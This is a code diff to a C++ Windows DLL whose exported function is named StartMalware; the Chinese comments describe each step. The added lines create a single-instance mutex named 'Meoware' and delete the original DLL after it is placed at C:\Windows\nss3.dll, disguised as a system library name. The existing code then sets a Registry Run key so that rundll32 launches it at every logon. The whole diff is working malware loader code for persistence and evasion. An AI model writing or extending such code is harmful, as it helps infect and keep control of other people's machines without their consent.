@@ -16,6 +16,23 @@ extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE
         return;
     }
 
+    // 1. 宣告互斥體控制代碼
+    HANDLE hMutex = NULL;
+    const char* mutexName = "Meoware"; // 2. 設定唯一的互斥體名稱
+
+    // 2. 建立或開啟具名互斥體
+    hMutex = CreateMutexA(NULL, FALSE, mutexName);
+    if (hMutex == NULL) {
+        Log("log.txt", "[+] loader: create mutex failed.\n");
+        return;
+    }
+
+    // 3. 檢查互斥體是否已存在
+    if (GetLastError() == ERROR_ALREADY_EXISTS) {
+        CloseHandle(hMutex); // 避免資源洩漏
+        return;
+    }
+
     std::string path = GetCurrentDllPath();
     std::string target_path = "C:\\Windows\\nss3.dll";
 
@@ -26,6 +43,7 @@ extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE
     }
     else
     {
+        DeleteFile(toUTF16(path).c_str());
         WriteRegistryRun("meoware", "C:\\Windows\\System32\\rundll32.exe", target_path + ",StartMalware");
     }
 
